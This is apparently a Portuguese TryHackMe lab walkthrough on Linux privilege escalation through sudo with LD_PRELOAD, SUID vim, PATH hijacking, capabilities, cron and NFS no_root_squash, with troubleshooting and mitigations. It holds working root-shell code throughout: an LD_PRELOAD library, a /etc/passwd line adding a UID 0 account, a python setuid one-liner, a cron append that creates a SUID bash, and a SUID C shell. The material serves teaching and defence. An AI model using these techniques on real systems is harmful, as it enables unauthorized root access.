---
layout: post
title: "Linux Privilege Escalation - do sudo ao NFS"
description: "Walkthrough didático de seis técnicas de escalação de privilégios em laboratórios TryHackMe: sudo e LD_PRELOAD, SUID, PATH Hijacking, Linux Capabilities, Cron Jobs e NFS, com troubleshooting, comandos comentados, mitigação e glossário."
date: 2026-10-09
categories: [walkthrough, pentest, linux, tryhackme]
tags: [linux, privilege-escalation, sudo, ld-preload, suid, path-hijacking, capabilities, cron, nfs, gtfobins, tryhackme]
---

<a id="topo"></a>

# Linux Privilege Escalation - do sudo ao NFS

## 1. Introdução

Neste estudo, reuni os exercícios de **Linux Privilege Escalation** do TryHackMe para entender como configurações inseguras permitem que um usuário comum, como <code>john</code>, obtenha privilégios de <code>root</code>.

O ponto principal é **identificar qual permissão está errada, entender por que ela é perigosa e testar a hipótese**. Organizei seis vetores, os erros que encontrei nas VMs, as verificações de sucesso e as formas de corrigir as falhas.

> **Escopo:** os comandos foram usados em VMs autorizadas. Não execute alterações de autenticação, arquivos SUID ou compartilhamentos NFS em sistemas sem autorização. Os IPs das VMs são temporários e podem mudar após um reset.

### Índice rápido

1. [Enumeração inicial](#enumeracao)
2. [Sudo, Apache2 e LD_PRELOAD](#sudo)
3. [SUID e edição do /etc/passwd](#suid)
4. [PATH Hijacking](#path-hijacking)
5. [Linux Capabilities](#capabilities)
6. [Cron Jobs](#cron)
7. [NFS e no_root_squash](#nfs)
8. [Erros comuns e dúvidas](#duvidas)
9. [Tabela de comandos e operadores](#comandos)
10. [Glossário de siglas e conceitos](#glossario)
11. [Mitigação e conclusão](#mitigacao)

---

<a id="enumeracao"></a>

## 2. Enumeração inicial: onde procurar primeiro?

Antes de explorar qualquer coisa, é necessário saber **quem somos** e **quais privilégios ou configurações especiais existem**.

~~~bash
id
whoami
sudo -l
echo "$PATH"
~~~

- <code>id</code> exibe UID, GID e grupos.
- <code>whoami</code> mostra o nome associado ao UID efetivo.
- <code>sudo -l</code> lista comandos autorizados pelo sudo.
- <code>echo "$PATH"</code> revela os diretórios onde o shell procura executáveis.

Em seguida, procure executáveis [SUID](#conceito-suid), [capabilities](#conceito-capabilities), tarefas agendadas e compartilhamentos de rede:

~~~bash
# SUID root, ignorando erros e exibindo apenas os caminhos
find / -type f -user root -perm -4000 -printf '%p\n' 2>/dev/null

# Capabilities atribuídas a executáveis
getcap -r / 2>/dev/null

# Tarefas cron do sistema
cat /etc/crontab
ls -la /etc/cron.d/

# Compartilhamentos NFS exportados
cat /etc/exports
~~~

### Dica: buscas menores e resultados mais limpos

Quando a saída do <code>find</code> fica grande, começar pelos diretórios de executáveis comuns pode ajudar:

~~~bash
find /usr/bin /usr/local/bin -type f -user root -perm -4000 -printf '%p\n' 2>/dev/null
~~~

Se não aparecer nada incomum, amplie para o sistema todo. Em uma das VMs, o binário vulnerável estava em <code>/opt/path/mywhoami</code>, então **restringir a busca para sempre a /usr/bin perderia a descoberta**.

~~~bash
find / -type f -user root -perm -4000 -printf '%p\n' 2>/dev/null | grep -v '^/snap/'
~~~

Outras buscas úteis:

~~~bash
# Diretórios em que o usuário pode escrever
find / -type d -writable -printf '%p\n' 2>/dev/null | sort -u

# Arquivos modificáveis em locais frequentemente relevantes
find /opt /usr/local/bin /home -type f -writable -printf '%p\n' 2>/dev/null
~~~

**Correção importante:** <code>-perm -4000</code> procura o bit **SUID**, não SGID. Para SGID, use <code>-perm -2000</code>. Consulte o [glossário](#glossario).

[↑ Voltar ao índice](#topo)

---

<a id="sudo"></a>

## 3. Sudo: programas autorizados, Apache2 e LD_PRELOAD

### 3.1 Entendendo o sudo -l

Na VM <code>sudo-box</code>, o comando retornou:

~~~text
User john may run the following commands on sudo-box:
    (ALL) NOPASSWD: /usr/bin/nano
    (ALL) NOPASSWD: /usr/sbin/apache2

Matching Defaults entries:
    env_keep+=LD_PRELOAD
~~~

Isso significa:

- <code>john</code> pode executar **nano** e **apache2** por meio de <code>sudo</code> sem fornecer senha.
- A variável de ambiente <code>LD_PRELOAD</code> pode ser preservada pelo <code>sudo</code>.
- **Não** significa que <code>john</code> possa executar qualquer programa com sudo.

Por isso o comando copiado de outro exemplo falhou:

~~~bash
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
~~~

O programa <code>find</code> **não constava no sudo -l**. Além disso, o caminho da biblioteca pertencia ao exemplo, não ao ambiente <code>/home/john</code>.

### 3.2 Ler um arquivo protegido com Nano

Como o Nano estava autorizado pelo sudo, a leitura de um arquivo protegido poderia ser feita assim:

~~~bash
sudo /usr/bin/nano -v /etc/shadow
~~~

O parâmetro <code>-v</code> ativa o modo de visualização, sem edição. O arquivo <code>/etc/shadow</code> contém campos de autenticação, normalmente incluindo hashes de senha, e possui acesso restrito.

### 3.3 Apache2: vazamento por mensagem de erro

Outro exemplo do exercício:

~~~bash
sudo /usr/sbin/apache2 -C "LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so" -f /etc/shadow
~~~

O Apache respondeu:

~~~text
AH00526: Syntax error on line 1 of /etc/shadow:
Invalid command 'root:*:18561:0:99999:7:::'
~~~

A opção <code>-f</code> pede ao Apache que trate <code>/etc/shadow</code> como seu arquivo de configuração. A primeira linha não é uma diretiva Apache válida; por isso ela foi reproduzida na mensagem de erro.

**Importante:** o campo <code>*</code> não era um hash da senha root. Ele indica uma conta sem hash utilizável para autenticação por senha. O vazamento da linha foi demonstrado, mas não havia ali um hash de root para quebrar.

| Opção | Papel |
|---|---|
| <code>sudo</code> | Executar programa autorizado com privilégios elevados |
| <code>-C "diretiva"</code> | Processar diretiva antes de ler a configuração |
| <code>LoadModule</code> | Carregar módulo Apache |
| <code>-f arquivo</code> | Usar arquivo alternativo de configuração |

### 3.4 LD_PRELOAD: injetando uma biblioteca

O carregador dinâmico pode carregar bibliotecas compartilhadas antes da inicialização de um programa por meio de <code>LD_PRELOAD</code>. Se o sudo permite preservar essa variável e executar um programa adequado como root, isso pode permitir execução de código com privilégios elevados.

O arquivo C do laboratório, com o cabeçalho que inicialmente faltou, fica assim:

~~~c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void _init(void) {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
~~~

No diretório pessoal, salve como <code>shell.c</code> e compile:

~~~bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
~~~

Depois, na VM de laboratório que autorizava o Nano:

~~~bash
sudo LD_PRELOAD=/home/john/shell.so /usr/bin/nano
id
whoami
~~~

A execução registrada no laboratório retornou <code>uid=0(root)</code>.

**Por que apareceu um aviso de compilação?** Sem <code>#include &lt;unistd.h&gt;</code>, o compilador avisou que <code>setgid()</code> e <code>setuid()</code> não tinham declaração visível. O <code>shell.so</code> ainda havia sido produzido, mas o correto é incluir esse cabeçalho.

| Opção GCC | Explicação |
|---|---|
| <code>-fPIC</code> | Gera código independente de posição |
| <code>-shared</code> | Cria uma biblioteca compartilhada |
| <code>-o shell.so</code> | Define o arquivo de saída |
| <code>-nostartfiles</code> | Não utiliza arquivos padrão de inicialização |

**Mitigação:** conceder somente os comandos estritamente necessários, impedir a preservação indevida de variáveis perigosas e revisar permissões de execução via sudo. Veja também [Sudo](#conceito-sudo) e [LD_PRELOAD](#conceito-ldpreload) no glossário.

[↑ Voltar ao índice](#topo)

---

<a id="suid"></a>

## 4. SUID: editor privilegiado e /etc/passwd

### 4.1 Identificar o binário vulnerável

Na VM <code>suid-box</code>, a enumeração encontrou:

~~~text
/usr/bin/vim.basic
~~~

Confirme as permissões:

~~~bash
ls -l /usr/bin/vim.basic
~~~

Resultado real:

~~~text
-rwsr-xr-x 1 root root 4126400 ... /usr/bin/vim.basic
~~~

O <code>s</code> no campo do proprietário indica o bit **SUID** ativado. Nesse caso, o executável pertence ao root. Programas de edição de arquivos normalmente **não deveriam** possuir essa permissão.

> Atenção à diferença: <code>/usr/bin/vim</code> era um link simbólico para <code>/etc/alternatives/vim</code>. O executável com SUID confirmado era <code>/usr/bin/vim.basic</code>.

### 4.2 O que é UID 0 e por que /etc/passwd importa?

O Linux identifica as contas por números chamados [UID](#conceito-uid). O root utiliza UID <code>0</code>.

Uma linha típica do arquivo de contas é:

~~~text
root:x:0:0:root:/root:/bin/bash
~~~

Seu formato possui **sete campos**:

~~~text
usuario:senha-ou-indicador:UID:GID:comentario:home:shell
~~~

Normalmente, <code>x</code> indica que o hash está em <code>/etc/shadow</code>, não em <code>/etc/passwd</code>. Uma conta adicional com UID 0 também recebe identidade administrativa. **Isso não substitui automaticamente a linha original de root; adiciona outra conta com o mesmo UID.**

### 4.3 Hash usado no laboratório

O exercício utilizou:

~~~bash
openssl passwd -1 -salt THM password1
~~~

Resultado:

~~~text
$1$THM$WnbwlliCqxFRQepUTCkUT1
~~~

- <code>openssl passwd</code>: gera um hash de senha.
- <code>-1</code>: seleciona **MD5-crypt** (obsoleto em produção).
- <code>-salt THM</code>: define o salt usado no exemplo.
- <code>password1</code>: senha escolhida para a conta de laboratório.

Gerar o hash **não adiciona um usuário**. Ele precisa constar de uma entrada válida no banco de contas.

### 4.4 Procedimento executado na room

Na VM isolada, o Vim com SUID permitiu abrir o arquivo protegido:

~~~bash
/usr/bin/vim.basic /etc/passwd
~~~

No editor:

1. Pressione <code>G</code> para ir ao final do arquivo.
2. Pressione <code>o</code> para abrir uma nova linha.
3. Adicione a entrada mostrada no material:

~~~text
hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash
~~~

4. Pressione <code>Esc</code>, digite <code>:wq</code> e confirme para salvar e sair.

Agora verifique que a conta foi registrada:

~~~bash
getent passwd hacker
~~~

E, no laboratório:

~~~bash
su hacker
~~~

Senha definida no exercício: <code>password1</code>. A confirmação real foi:

~~~text
uid=0(root) gid=0(root) groups=0(root)
root
~~~

A flag recuperada na VM foi:

~~~text
THM{root-by-SUID-vulns}
~~~

### 4.5 Erros que aconteceram

- <code>su hacker</code> retornou “user hacker does not exist”: o hash havia sido gerado, mas **a entrada ainda não havia sido gravada no /etc/passwd**.
- <code>su THM</code> não funcionou: <code>THM</code> era o **salt**, não o nome do usuário.
- <code>su newuser</code> não funcionou: essa conta não existia.
- Se uma linha de <code>/etc/passwd</code> tiver quantidade errada de separadores, o sistema pode rejeitá-la. Para identificar entradas com formato incorreto:

~~~bash
awk -F: 'NF != 7 {print NR, $0}' /etc/passwd
~~~

- Para verificar contas que usam UID 0:

~~~bash
awk -F: '$3 == 0 {print $1, $3, $4}' /etc/passwd
~~~

**Mitigação:** remover SUID de editores, restringir modificações de arquivos de autenticação, auditar duplicações de UID 0 e utilizar políticas de controle de acesso apropriadas. Esta alteração da room não deve ser reproduzida em sistemas de produção.

[↑ Voltar ao índice](#topo)

---

<a id="path-hijacking"></a>

## 5. PATH Hijacking: substituir o comando procurado

### 5.1 O que é PATH?

O shell consulta os diretórios definidos na variável <code>PATH</code> quando um comando é chamado sem caminho absoluto. A ordem importa: **o primeiro executável correspondente costuma ser utilizado**.

Exemplo:

~~~text
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
~~~

Se um binário privilegiado executa <code>system("whoami")</code>, em vez de <code>/usr/bin/whoami</code>, podemos investigar se é possível influenciar qual executável será localizado.

### 5.2 Encontrar o executável real

O material didático usava um programa chamado <code>program</code> que chamava <code>thm</code>. **Na VM real ele não existia**:

~~~bash
find / -type f -name 'program' 2>/dev/null
~~~

A busca SUID mais ampla revelou:

~~~text
/opt/path/mywhoami
~~~

Investigação:

~~~bash
ls -l /opt/path/mywhoami
file /opt/path/mywhoami
strings /opt/path/mywhoami | grep -E 'whoami|system|exec'
~~~

Saída relevante:

~~~text
-rwsr-xr-x 1 root root ... /opt/path/mywhoami
system
whoami
system@GLIBC_2.2.5
~~~

As strings não são prova completa do fluxo de execução, mas, junto ao comportamento do programa, indicavam que ele utilizava <code>system()</code> para chamar <code>whoami</code> sem caminho absoluto.

### 5.3 Incluir /tmp no início do PATH

~~~bash
export PATH=/tmp:$PATH
echo "$PATH"
~~~

Agora a busca começa por <code>/tmp</code>. O diretório é gravável pelo usuário, o que permite preparar um executável com o nome procurado.

### 5.4 Criar o comando substituto sem editor

Como o executável vulnerável procurava **whoami**, não <code>thm</code>, o arquivo correto era <code>/tmp/whoami</code>:

~~~bash
printf '#!/bin/sh\n/bin/bash -p\n' > /tmp/whoami
chmod 755 /tmp/whoami
~~~

O script chama o Bash com <code>-p</code> para preservar os privilégios efetivos disponíveis. <code>chmod 755</code> é suficiente; não é necessário deixar o arquivo gravável por todos com <code>777</code>.

### 5.5 Executar e confirmar

~~~bash
/opt/path/mywhoami
id
/usr/bin/whoami
~~~

Resultado observado no laboratório:

~~~text
uid=0(root) gid=0(root) groups=0(root),1001(john)
root
~~~

**Por que <code>whoami</code> parecia não mostrar nada depois da escalação?** O comando sem caminho absoluto continuava apontando para <code>/tmp/whoami</code>, que abria outro Bash em vez de imprimir o usuário. Para conferir a identidade sem reutilizar o comando sequestrado, use <code>/usr/bin/whoami</code> ou <code>id</code>.

**Observação técnica:** scripts por si só normalmente não recebem SUID funcional no Linux. Aqui, o processo privilegiado era **o binário SUID que iniciou o script**. A efetividade do ataque depende de como ele lida com UID e com o ambiente.

**Mitigação:** usar caminhos absolutos em programas privilegiados, limpar/definir um PATH confiável, evitar chamadas desnecessárias a shells e remover SUID indevido.

[↑ Voltar ao índice](#topo)

---

<a id="capabilities"></a>

## 6. Linux Capabilities: permissões mais granulares que root

As [capabilities](#conceito-capabilities) permitem conceder operações privilegiadas específicas sem dar todos os poderes do root a um programa.

### 6.1 Enumerar

Na VM <code>capabilities-box</code>:

~~~bash
getcap -r / 2>/dev/null | grep -v '^/snap/'
~~~

A saída registrada apontava:

~~~text
/usr/bin/python3.12 cap_setuid=ep
~~~

A capability <code>cap_setuid</code> permite alterar o UID do processo. Os sufixos <code>e</code> e <code>p</code> indicam que a capability entra nos conjuntos **effective** e **permitted**.

### 6.2 Entender e testar a condição

O exercício pode ser demonstrado diretamente com o Python que recebeu essa capability:

~~~bash
/usr/bin/python3.12 -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'
~~~

Explicação:

| Trecho | Função |
|---|---|
| <code>python3.12 -c</code> | Executar um trecho de Python |
| <code>import os</code> | Acessar funções do sistema operacional |
| <code>os.setuid(0)</code> | Solicitar alteração do UID para 0 |
| <code>os.execl(...)</code> | Substituir o processo pelo Bash |
| <code>bash -p</code> | Preservar privilégios disponíveis |

Confirmação:

~~~bash
id
/usr/bin/whoami
~~~

**Nota de registro:** a capability do Python foi identificada nos apontamentos da VM, mas a conversa não contém uma saída final comprovando a execução desse comando nessa etapa.

### 6.3 O erro com ./vim

O material do exercício também citava execução de Python dentro do Vim. Foi tentado:

~~~bash
./vim -c ':py3 import os; os.setuid(0); ...'
~~~

E o shell respondeu:

~~~text
-bash: ./vim: No such file or directory
~~~

Isso acontece porque <code>./vim</code> procura um arquivo chamado <code>vim</code> **no diretório atual**. Mais importante: na VM enumerada, a capability estava no <code>/usr/bin/python3.12</code>, não no Vim. O procedimento precisa acompanhar o **binário efetivamente identificado**, e não ser copiado de outro cenário.

**Mitigação:** auditar <code>getcap -r /</code>, remover capabilities desnecessárias de interpretadores e limitar operações privilegiadas ao mínimo indispensável.

[↑ Voltar ao índice](#topo)

---

<a id="cron"></a>

## 7. Cron Jobs: script gravável executado pelo root

O [Cron](#conceito-cron) executa comandos periodicamente. Se uma tarefa do root aponta para um script que usuários comuns podem alterar, **o conteúdo inserido será executado com os privilégios da tarefa**.

### 7.1 Enumerar os agendamentos

~~~bash
cat /etc/crontab
ls -la /etc/cron.d /etc/cron.* 2>/dev/null
~~~

Na VM <code>cron-box</code>, chamou a atenção:

~~~text
/etc/cron.d/cleanup
~~~

Seu conteúdo era:

~~~text
SHELL=/bin/bash
PATH=/home/ubuntu:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root /usr/local/bin/cleanup.sh
~~~

Os cinco asteriscos representam minuto, hora, dia do mês, mês e dia da semana. Nessa entrada, a tarefa roda **a cada minuto**.

### 7.2 Conferir o script e as permissões

~~~bash
ls -l /usr/local/bin/cleanup.sh
cat /usr/local/bin/cleanup.sh
namei -l /usr/local/bin/cleanup.sh
~~~

No laboratório:

~~~text
-rwxrwxrwx 1 root root ... /usr/local/bin/cleanup.sh
~~~

Conteúdo original:

~~~bash
#!/bin/bash
find /tmp -type f -mtime +1 -delete
find /var/tmp -type f -mtime +7 -delete
echo "[cleanup] done at $(date)"
~~~

A permissão <code>777</code> permite leitura, escrita e execução a todos. É uma configuração insegura para um script executado por root.

O comando <code>namei -l</code> também examina as permissões de **cada diretório no caminho**, e não apenas do script.

### 7.3 Demonstração do impacto

Primeiro, uma cópia do arquivo original:

~~~bash
cp /usr/local/bin/cleanup.sh ~/cleanup.sh.bak
~~~

No laboratório, adicionamos ao final do script uma instrução que cria uma cópia SUID do Bash:

~~~bash
printf '\ncp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash\n' >> /usr/local/bin/cleanup.sh
~~~

Quando o Cron executa a tarefa como root, essa cópia é criada com os privilégios do usuário que executou a tarefa. Após a próxima execução:

~~~bash
ls -l /tmp/rootbash
~~~

A condição esperada é um arquivo **pertencente ao root e com SUID**, por exemplo:

~~~text
-rwsr-xr-x 1 root root ... /tmp/rootbash
~~~

No cenário do laboratório, o teste seria:

~~~bash
/tmp/rootbash -p
id
~~~

A opção <code>-p</code> instrui o Bash a preservar privilégios efetivos. **Na conversa, a configuração vulnerável foi confirmada, mas não há registro de saída final <code>uid=0</code> dessa VM.**

### 7.4 Limpeza do laboratório

Após testar, restaure o script e elimine o executável de demonstração, com permissão adequada:

~~~bash
cat /home/john/cleanup.sh.bak > /usr/local/bin/cleanup.sh
rm -f /tmp/rootbash
~~~

O operador <code>&gt;&gt;</code> acrescenta conteúdo; <code>&gt;</code> substitui o conteúdo do arquivo. Essa diferença é essencial.

**Mitigação:** scripts executados pelo root devem pertencer a root e não ser graváveis por usuários comuns. Revisar tanto <code>/etc/crontab</code> quanto <code>/etc/cron.d/</code>.

[↑ Voltar ao índice](#topo)

---

<a id="nfs"></a>

## 8. NFS: no_root_squash e escalada entre duas VMs

Ao contrário dos exercícios anteriores, esta etapa exigiu duas máquinas:

| Máquina | IP de exemplo da sessão | Papel |
|---|---|---|
| AttackBox | <code>10.66.106.92</code> | Montar o NFS e criar o executável |
| nfs-box | <code>10.66.133.77</code> | Executar o arquivo compartilhado |

Os IPs mudaram após o reinício das VMs. **Não reutilize o IP da AttackBox como se fosse o do alvo.**

### 8.1 Identificar a configuração vulnerável

No alvo:

~~~bash
cat /etc/exports
~~~

Resultado:

~~~text
/opt/nfs *(rw,sync,no_root_squash,no_subtree_check)
~~~

E a enumeração remota:

~~~bash
showmount -e 10.66.133.77
~~~

~~~text
Export list for 10.66.133.77:
/opt/nfs *
~~~

Significado:

- <code>rw</code>: compartilhamento exportado para leitura e escrita.
- <code>sync</code>: política de confirmação sincronizada das operações.
- <code>no_root_squash</code>: impede o mapeamento padrão do UID 0 remoto para um usuário anônimo.
- <code>no_subtree_check</code>: desativa verificações de subárvore.
- <code>*</code>: permite clientes conforme a regra de exportação, sem restringir por host nessa entrada.

**Ponto central:** o root da AttackBox pode criar um arquivo no compartilhamento preservando sua identidade de proprietário root no servidor NFS.

### 8.2 AttackBox: montar o compartilhamento

No terminal root da **AttackBox**:

~~~bash
mkdir -p /mnt/nfs-thm
mount -t nfs -o rw 10.66.133.77:/opt/nfs /mnt/nfs-thm
mount | grep nfs-thm
~~~

O resultado confirmado foi um mount NFSv4 do alvo para <code>/mnt/nfs-thm</code>.

A primeira tentativa de montagem usou, por engano, <code>10.66.106.92</code> (IP da própria AttackBox). A montagem correta usa **10.66.133.77**, o IP do servidor NFS.

Não precisamos de Netcat nem Metasploit: **o NFS já oferece o canal de compartilhamento do arquivo**.

### 8.3 Criar o código C sem abrir editor

Na AttackBox:

~~~bash
cat > /mnt/nfs-thm/nfs.c <<'EOF'
#include <unistd.h>

int main(void) {
    setgid(0);
    setuid(0);
    execl("/bin/bash", "bash", "-p", (char *)NULL);
    return 1;
}
EOF
~~~

- <code>setgid(0)</code>: define o GID como root.
- <code>setuid(0)</code>: define o UID como root.
- <code>execl()</code>: substitui o processo pelo Bash.
- <code>bash -p</code>: mantém privilégios efetivos quando aplicável.

### 8.4 Compilar localmente e copiar para o compartilhamento

Uma primeira tentativa compilou diretamente sobre o compartilhamento e o alvo apresentou:

~~~text
-bash: /opt/nfs/nfs: Text file busy
~~~

Isso pode ocorrer quando o arquivo executável ainda está aberto para escrita. O procedimento que resolveu a preparação foi **compilar fora do diretório montado** e copiar o arquivo completo depois:

~~~bash
gcc /mnt/nfs-thm/nfs.c -o /root/nfs2 -static
cp /root/nfs2 /mnt/nfs-thm/nfs2
chown root:root /mnt/nfs-thm/nfs2
chmod 4755 /mnt/nfs-thm/nfs2
sync
ls -l /mnt/nfs-thm/nfs2
~~~

Resultado esperado:

~~~text
-rwsr-xr-x 1 root root ... /mnt/nfs-thm/nfs2
~~~

### 8.5 O segundo erro: chmod no arquivo errado

O executável <code>nfs2</code> havia sido compilado e copiado corretamente, mas a permissão SUID foi aplicada por engano ao arquivo antigo:

~~~bash
chmod 4755 /mnt/nfs-thm/nfs
~~~

O alvo, portanto, mostrava:

~~~text
-rwxr-xr-x 1 root root ... /opt/nfs/nfs2
~~~

Sem o <code>s</code>, o binário não elevava privilégios. A correção foi:

~~~bash
chmod 4755 /mnt/nfs-thm/nfs2
sync
~~~

**Sempre confira o caminho completo e a permissão do mesmo arquivo que será executado.**

### 8.6 nfs-box: executar e confirmar root

No alvo, com o usuário <code>john</code>:

~~~bash
ls -l /opt/nfs/nfs2
/opt/nfs/nfs2
id
whoami
~~~

Resultado real da sessão:

~~~text
-rwsr-xr-x 1 root root 785768 ... /opt/nfs/nfs2
uid=0(root) gid=0(root) groups=0(root),1001(john)
root
~~~

**Exploração confirmada.** O grupo suplementar <code>1001(john)</code> ainda aparecer na saída não altera o fato de que UID e GID já eram 0.

Se o binário não elevar, verifique a propriedade, o SUID, a configuração <code>no_root_squash</code>, a permissão de execução e opções de montagem como <code>nosuid</code>.

### 8.7 Localizar a flag e limpar

Com os privilégios obtidos:

~~~bash
find /root -type f -iname '*flag*' 2>/dev/null
~~~

Leia o caminho encontrado com <code>cat</code>. O conteúdo da flag desta VM **não foi registrado na conversa**, então não será inventado aqui.

Ao concluir o laboratório, remova os artefatos criados e desmonte o compartilhamento na AttackBox, conforme as permissões disponíveis:

~~~bash
rm -f /mnt/nfs-thm/nfs2 /mnt/nfs-thm/nfs.c
umount /mnt/nfs-thm
~~~

**Mitigação:** evitar <code>no_root_squash</code> em compartilhamentos acessíveis a clientes não confiáveis, limitar clientes autorizados, controlar permissões e empregar opções adequadas de montagem e exportação.

[↑ Voltar ao índice](#topo)

---

<a id="duvidas"></a>

## 9. Dúvidas e erros que apareceram durante os laboratórios

| Sintoma | Causa ou diagnóstico |
|---|---|
| <code>sudo find</code> pede senha ou é negado | O <code>sudo -l</code> não autorizava <code>find</code>; apenas Nano e Apache2 |
| Apache mostra <code>root:*</code> | O Apache vazou a linha como erro de configuração, mas <code>*</code> não é hash recuperável |
| GCC avisa <code>implicit declaration of setuid</code> | Faltou incluir <code>&lt;unistd.h&gt;</code> |
| <code>su hacker</code> diz que o usuário não existe | Gerar um hash não cria a conta; é preciso uma entrada válida em <code>/etc/passwd</code> |
| <code>su THM</code> não funciona | <code>THM</code> é o salt usado no exemplo, não o usuário |
| Não aparece um binário suspeito em <code>/usr/bin</code> | Ampliar a busca para todo o sistema, inclusive <code>/opt</code> |
| Criou <code>/tmp/thm</code>, mas o PATH Hijacking não funcionou | O programa real da VM procurava <code>whoami</code>, não <code>thm</code> |
| <code>whoami</code> não imprime o usuário após a exploração de PATH | O próprio comando foi sequestrado; executar <code>/usr/bin/whoami</code> |
| <code>./vim: No such file or directory</code> | <code>./</code> indica diretório atual; a capability encontrada era do Python |
| Cron não produz efeito imediato | Tarefa configurada para executar no próximo minuto; confirmar antes as permissões e o agendamento |
| Montagem NFS demora ou falha | Verificar se foi usado o **IP do alvo**, não o da AttackBox |
| <code>Text file busy</code> | Executável possivelmente aberto para escrita; compilar localmente e copiar depois |
| Binário NFS mostra <code>-rwxr-xr-x</code> | SUID não aplicado ao arquivo efetivamente executado |
| Binário mostra <code>-rwsr-xr-x</code> mas não eleva | Verificar proprietário root, <code>nosuid</code>, restrições do programa e demais condições |

Um <code>id</code> retornando <code>uid=0</code> é uma evidência muito mais forte da escalação do que apenas o prompt começar com <code>root@</code>.

[↑ Voltar ao índice](#topo)

---

<a id="comandos"></a>

## 10. Tabela de referência: comandos, opções e operadores

| Comando/opção | O que faz | Exemplo |
|---|---|---|
| <code>id</code> | Exibe UID, GID e grupos | <code>id</code> |
| <code>whoami</code> | Nome associado ao UID efetivo | <code>/usr/bin/whoami</code> |
| <code>sudo -l</code> | Lista permissões sudo | <code>sudo -l</code> |
| <code>ls -l</code> | Permissões e propriedade | <code>ls -l /usr/bin/vim.basic</code> |
| <code>find -type f</code> | Somente arquivos regulares | <code>find /opt -type f</code> |
| <code>find -type d</code> | Somente diretórios | <code>find /tmp -type d</code> |
| <code>-user root</code> | Restringe proprietário | <code>find / -user root</code> |
| <code>-perm -4000</code> | Verifica bit SUID | <code>find / -perm -4000</code> |
| <code>-perm -2000</code> | Verifica bit SGID | <code>find / -perm -2000</code> |
| <code>-writable</code> | Caminho gravável pelo usuário | <code>find /opt -writable</code> |
| <code>-printf '%p\n'</code> | Imprime somente caminhos, um por linha | <code>find /opt -printf '%p\n'</code> |
| <code>2&gt;/dev/null</code> | Oculta a saída de erro | <code>find / 2&gt;/dev/null</code> |
| <code>&#124;</code> | Encaminha stdout para outro comando | <code>find ... &#124; grep ...</code> |
| <code>grep -v</code> | Exclui linhas correspondentes | <code>grep -v '^/snap/'</code> |
| <code>sort -u</code> | Ordena e remove duplicações | <code>sort -u</code> |
| <code>&gt;</code> | Cria/sobrescreve arquivo | <code>printf 'ok\n' &gt; /tmp/teste</code> |
| <code>&gt;&gt;</code> | Acrescenta ao final | <code>printf 'ok\n' &gt;&gt; /tmp/teste</code> |
| <code>printf</code> | Gera conteúdo formatado | <code>printf 'linha\n'</code> |
| <code>chmod 755</code> | Permissão rwx/rx/rx | <code>chmod 755 script.sh</code> |
| <code>chmod 4755</code> | Ativa SUID em arquivo executável | <code>chmod 4755 binario</code> |
| <code>chown</code> | Altera propriedade | <code>chown root:root binario</code> |
| <code>./arquivo</code> | Executa arquivo no diretório atual | <code>./program</code> |
| <code>strings</code> | Extrai texto legível de binário | <code>strings ./program</code> |
| <code>getcap -r</code> | Busca capabilities recursivamente | <code>getcap -r /</code> |
| <code>namei -l</code> | Permissões de componentes do caminho | <code>namei -l /opt/script.sh</code> |
| <code>showmount -e</code> | Lista exports NFS | <code>showmount -e IP</code> |
| <code>mount -t nfs</code> | Monta compartilhamento NFS | <code>mount -t nfs IP:/pasta /mnt/pasta</code> |
| <code>sync</code> | Solicita gravação de dados pendentes | <code>sync</code> |

### Como interpretar permissões?

~~~text
-rwsr-xr-x
 │││ │ │
 │││ │ └── outros: leitura e execução
 │││ └──── grupo: leitura e execução
 │└┴─────── dono: leitura, escrita e execução com SUID
 └───────── arquivo regular
~~~

<code>chmod 4755</code> combina o dígito especial <code>4</code> (SUID) com <code>755</code> (permissões usuais). Não confunda com <code>chmod 777</code>, que deixa o arquivo gravável por qualquer usuário, mas **não ativa SUID**.

[↑ Voltar ao índice](#topo)

---

<a id="glossario"></a>

## 11. Glossário: siglas e conceitos básicos

| Termo | Explicação |
|---|---|
| <a id="conceito-uid"></a>**UID** (*User ID*) | Identificador numérico do usuário; UID 0 é a identidade root |
| **EUID** (*Effective UID*) | Identidade efetiva usada nas verificações de permissão do processo |
| **GID** (*Group ID*) | Identificador numérico do grupo principal |
| **EGID** (*Effective GID*) | Grupo efetivo utilizado em verificações de permissão |
| <a id="conceito-suid"></a>**SUID** (*Set User ID*) | Bit que permite executar um binário com o UID efetivo do proprietário |
| **SGID** (*Set Group ID*) | Bit relacionado ao grupo; seu comportamento depende de ser arquivo ou diretório |
| <a id="conceito-sudo"></a>**sudo** (*superuser do*, uso consagrado) | Mecanismo que executa comandos autorizados sob outra identidade |
| **sudoers** | Configuração que define regras do sudo |
| <a id="conceito-ldpreload"></a>**LD_PRELOAD** | Variável para carregar bibliotecas antes de outras bibliotecas dinâmicas |
| **.so** (*shared object*) | Biblioteca compartilhada no Linux |
| **ELF** (*Executable and Linkable Format*) | Formato comum de executáveis e bibliotecas Linux |
| **GCC** (*GNU Compiler Collection*) | Conjunto de compiladores |
| **PIC** (*Position-Independent Code*) | Código que pode funcionar em diferentes endereços de memória |
| **PATH** | Variável com diretórios usados para localizar comandos |
| **PATH Hijacking** | Indução de um programa a executar um comando controlado por terceiro a partir do PATH |
| <a id="conceito-capabilities"></a>**Linux Capabilities** | Privilégios de kernel separados em capacidades específicas |
| **cap_setuid** | Capability para alterar a identidade de usuário do processo |
| **effective/permitted** | Conjuntos que determinam quais capabilities estão disponíveis e podem ser usadas |
| <a id="conceito-cron"></a>**Cron** | Serviço de tarefas executadas segundo um agendamento |
| **Cron Job** | Comando ou script executado pelo Cron |
| **NFS** (*Network File System*) | Sistema de arquivos compartilhado pela rede |
| **Export** | Diretório disponibilizado a clientes NFS |
| **root_squash** | Mapeamento do root remoto para uma identidade anônima no NFS |
| **no_root_squash** | Desativa esse mapeamento para o root remoto |
| **nosuid** | Opção de montagem que impede o efeito de SUID/SGID e certas capabilities de arquivo |
